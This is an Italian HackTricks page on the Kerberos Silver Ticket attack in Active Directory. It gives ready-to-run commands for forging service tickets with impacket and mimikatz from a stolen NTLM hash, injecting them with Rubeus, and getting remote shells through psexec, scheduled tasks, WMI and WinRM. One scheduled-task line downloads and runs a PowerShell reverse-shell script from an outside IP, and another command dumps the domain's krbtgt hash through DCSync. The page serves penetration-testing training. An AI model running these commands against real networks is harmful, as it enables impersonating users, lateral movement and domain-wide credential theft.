# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attacco **Silver Ticket** comporta lo sfruttamento dei ticket di servizio negli ambienti Active Directory (AD). Questo metodo si basa su **acquisire l'hash NTLM di un account di servizio**, come un account computer, per forgiare un ticket del Ticket Granting Service (TGS). Con questo ticket falsificato, un attaccante può accedere a servizi specifici sulla rete, **impersonando qualsiasi utente**, tipicamente puntando a privilegi amministrativi. Si sottolinea che l'uso di chiavi AES per forgiare ticket è più sicuro e meno rilevabile.

Per la creazione di ticket, vengono impiegati diversi strumenti in base al sistema operativo:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Su Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Il servizio CIFS è evidenziato come un obiettivo comune per accedere al file system della vittima, ma altri servizi come HOST e RPCSS possono essere sfruttati anche per attività e query WMI.

## Servizi Disponibili

| Tipo di Servizio                           | Servizi Silver Tickets                                                    |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>A seconda del sistema operativo anche:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In alcune occasioni puoi semplicemente chiedere: WINRM</p> |
| Attività Pianificate                       | HOST                                                                    |
| Condivisione File di Windows, anche psexec | CIFS                                                                    |
| Operazioni LDAP, incluso DCSync           | LDAP                                                                    |
| Strumenti di Amministrazione Remota di Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
| Golden Tickets                             | krbtgt                                                                |

Utilizzando **Rubeus** puoi **richiedere tutti** questi biglietti utilizzando il parametro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ID Evento dei Silver Tickets

- 4624: Accesso all'Account
- 4634: Disconnessione dall'Account
- 4672: Accesso Amministrativo

## Abuso dei Biglietti di Servizio

Negli esempi seguenti immaginiamo che il biglietto venga recuperato impersonando l'account amministratore.

### CIFS

Con questo biglietto sarai in grado di accedere alla cartella `C$` e `ADMIN$` tramite **SMB** (se sono esposte) e copiare file in una parte del file system remoto semplicemente facendo qualcosa come:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Potrai anche ottenere una shell all'interno dell'host o eseguire comandi arbitrari utilizzando **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con questo permesso puoi generare attività pianificate nei computer remoti ed eseguire comandi arbitrari:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con questi biglietti puoi **eseguire WMI nel sistema della vittima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trova **ulteriori informazioni su wmiexec** nella seguente pagina:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con l'accesso winrm a un computer puoi **accedervi** e persino ottenere un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Controlla la seguente pagina per apprendere **ulteriori modi per connettersi a un host remoto utilizzando winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Nota che **winrm deve essere attivo e in ascolto** sul computer remoto per accedervi.

### LDAP

Con questo privilegio puoi eseguire il dump del database DC utilizzando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Scopri di più su DCSync** nella seguente pagina:

## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
